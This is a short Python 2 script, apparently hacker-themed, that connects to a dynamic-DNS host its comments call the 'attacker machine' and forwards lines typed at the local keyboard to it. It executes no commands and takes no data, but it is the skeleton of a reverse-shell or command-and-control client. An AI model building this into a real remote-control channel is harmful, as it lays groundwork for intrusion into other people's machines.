#!/usr/bin/python
# imports here
import socket,subprocess,time,sys
def con():
  HOST = 'darkarmy.ddns.net'    # The remote host
  PORT = 443            # The same port as used by the server
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
  try:

    socket.setdefaulttimeout(2)
    s.connect((HOST, PORT))
    s.send("Connection Established")
    s.send("\n")

  except Exception, e:
    print "[-] Connection failed"
    print "[-] Error = " + str(e)
    v = raw_input("Try again y/n? ")
    if v == "n":
      s.close()
      sys.exit()
    else:
      con()
  while 1 :
      a = raw_input(">>> ")
      if a == "q":
          break;
          s.close()
      else:

          s.send("Mcorp>> ")
          s.send(a)
          s.send("\n")
# start loop
con()
